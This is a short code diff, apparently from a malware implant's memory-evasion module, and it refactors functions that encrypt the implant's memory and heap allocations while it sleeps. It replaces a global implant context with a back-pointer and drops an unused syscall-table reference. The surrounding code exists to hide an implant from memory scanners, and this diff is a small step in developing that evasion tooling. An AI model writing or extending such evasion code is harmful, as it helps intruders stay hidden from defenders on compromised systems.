@@ -22,9 +22,6 @@
 /* Current-process pseudo-handle */
 #define NtCurrentProcess() ((HANDLE)(ULONG_PTR)-1)
 
-/* External globals */
-extern SYSCALL_TABLE g_syscall_table;
-
 /* ------------------------------------------------------------------ */
 /*  PRNG for key generation (LCG, same as stackspoof/sleep)            */
 /* ------------------------------------------------------------------ */
@@ -190,11 +187,10 @@ NTSTATUS memguard_encrypt(EVASION_CONTEXT *ctx) {
      * to avoid keystream reuse. */
     DWORD heap_counter = ((DWORD)mg->implant_size + 63) / 64;
 
-    /* Access the sleep context for heap list */
+    /* Access the sleep context for heap list via back-pointer */
     SLEEP_CONTEXT *sctx = NULL;
-    extern IMPLANT_CONTEXT g_ctx;
-    if (g_ctx.sleep_ctx)
-        sctx = (SLEEP_CONTEXT *)g_ctx.sleep_ctx;
+    if (ctx->implant_ctx && ctx->implant_ctx->sleep_ctx)
+        sctx = (SLEEP_CONTEXT *)ctx->implant_ctx->sleep_ctx;
 
     if (sctx) {
         HEAP_ALLOC_ENTRY *cur = sctx->heap_list;
@@ -291,9 +287,8 @@ NTSTATUS memguard_decrypt(EVASION_CONTEXT *ctx) {
     DWORD heap_counter = ((DWORD)mg->implant_size + 63) / 64;
 
     SLEEP_CONTEXT *sctx = NULL;
-    extern IMPLANT_CONTEXT g_ctx;
-    if (g_ctx.sleep_ctx)
-        sctx = (SLEEP_CONTEXT *)g_ctx.sleep_ctx;
+    if (ctx->implant_ctx && ctx->implant_ctx->sleep_ctx)
+        sctx = (SLEEP_CONTEXT *)ctx->implant_ctx->sleep_ctx;
 
     if (sctx) {
         HEAP_ALLOC_ENTRY *cur = sctx->heap_list;
